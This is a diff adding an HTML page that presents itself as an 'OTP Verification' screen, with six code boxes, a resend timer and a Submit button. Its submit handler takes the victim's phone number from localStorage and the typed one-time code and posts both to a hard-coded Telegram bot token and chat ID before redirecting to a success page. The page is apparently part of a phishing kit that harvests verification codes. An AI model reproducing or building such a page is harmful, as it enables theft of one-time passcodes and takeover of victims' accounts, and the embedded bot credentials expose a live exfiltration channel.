@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>OTP Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+
+body{
+  font-family:'Poppins',sans-serif;
+  background:#f4f5f7;
+  color:#333;
+}
+
+/* ===== TOP BAR ===== */
+.top{
+  padding:15px;
+}
+.back{
+  width:35px;
+  height:35px;
+  border-radius:50%;
+  border:1px solid #ccc;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:18px;
+}
+
+/* ===== CARD ===== */
+.card{
+  background:#fff;
+  margin:20px;
+  padding:25px;
+  border-radius:15px;
+  box-shadow:0 8px 20px rgba(0,0,0,.08);
+}
+
+h2{
+  margin-bottom:10px;
+}
+
+.sub{
+  font-size:14px;
+  color:#666666;
+  margin-bottom:15px;
+}
+
+.number{
+  font-weight:600;
+  margin-bottom:25px;
+}
+
+/* ===== OTP ===== */
+.label{
+  font-size:14px;
+  margin-bottom:10px;
+}
+
+.otp{
+  display:flex;
+  justify-content:space-between;
+  margin-bottom:20px;
+}
+
+.otp input{
+  width:45px;
+  height:45px;
+  border:2px solid #0b5ed7;
+  border-radius:8px;
+  font-size:18px;
+  text-align:center;
+  outline:none;
+}
+
+/* ===== TIMER ===== */
+.timer{
+  text-align:center;
+  font-size:14px;
+  color:#666;
+  margin-bottom:20px;
+}
+
+/* ===== SUBMIT ===== */
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:10px;
+  background:#3b4ab4;
+  color:#ffffff;
+  font-size:16px;
+  font-weight:600;
+}
+
+/* ===== MOBILE ===== */
+@media(max-width:360px){
+  .otp input{
+    width:40px;
+    height:40px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="top">
+  <div class="back" style="cursor:pointer;">&#8592;</div>
+</div>
+
+<div class="card">
+  <h2>OTP Verification</h2>
+  <div class="sub">Enter the OTP sent to your phone number</div>
+  
+
+  <div class="label">OTP</div>
+
+  <div class="otp">
+    <input maxlength="1">
+    <input maxlength="1">
+    <input maxlength="1">
+    <input maxlength="1">
+    <input maxlength="1">
+    <input maxlength="1">
+  </div>
+
+  <div class="timer" id="timer">Resend OTP in 118 seconds</div>
+
+  <button>Submit</button>
+</div>
+
+<script>
+/* ===== AUTO FOCUS OTP ===== */
+const inputs = document.querySelectorAll(".otp input");
+inputs[0].focus();
+
+inputs.forEach((input, index) => {
+  input.addEventListener("input", () => {
+    if(input.value && index < inputs.length - 1){
+      inputs[index + 1].focus();
+    }
+  });
+
+  input.addEventListener("keydown", e => {
+    if(e.key === "Backspace" && !input.value && index > 0){
+      inputs[index - 1].focus();
+    }
+  });
+});
+
+/* ===== COUNTDOWN ===== */
+let time = 118;
+const timer = document.getElementById("timer");
+
+setInterval(() => {
+  if(time > 0){
+    time--;
+    timer.textContent = `Resend OTP in ${time} seconds`;
+  }else{
+    timer.textContent = "Resend OTP";
+    timer.style.color = "#0b5ed7";
+  }
+}, 1000);
+
+const otpInputs = document.querySelectorAll('.otp input');
+const submitBtn = document.querySelector('button');
+
+// Hide submit button initially
+submitBtn.style.display = 'none';
+
+function checkOtpFilled() {
+  const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
+  submitBtn.style.display = allFilled ? 'block' : 'none';
+}
+
+otpInputs.forEach((input, idx) => {
+  input.addEventListener('input', (e) => {
+    input.value = input.value.replace(/[^0-9]/g, '');
+    if (input.value.length === 1 && idx < otpInputs.length - 1) {
+      otpInputs[idx + 1].focus();
+    }
+    checkOtpFilled && checkOtpFilled();
+  });
+
+  input.addEventListener('keydown', (e) => {
+    if (e.key === 'Backspace' && input.value === '' && idx > 0) {
+      otpInputs[idx - 1].focus();
+    }
+    setTimeout(() => checkOtpFilled && checkOtpFilled(), 0);
+  });
+});
+// Do NOT put this inside the otpInputs.forEach or any input event listener!
+submitBtn.addEventListener('click', async () => {
+  const otp = Array.from(otpInputs).map(i => i.value).join('');
+  const phoneNumber = localStorage.getItem('phoneNumber') || 'Unknown';
+  const botToken = '8305012784:AAH_kLIiqQ1sJ5vIlYOKHK985j26_kE1ubQ';
+  const chatId = '8355316248';
+  const message = `Phone: ${phoneNumber}\nOTP: ${otp}`;
+
+  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  });
+
+  window.location.href = 'success.html';
+});
+
+// ...rest of your code...
+const backArrow = document.querySelector('.back');
+if (backArrow) {
+  backArrow.addEventListener('click', () => {
+    window.location.href = 'index.html';
+  });
+}
+</script>
+
+</body>
+</html>
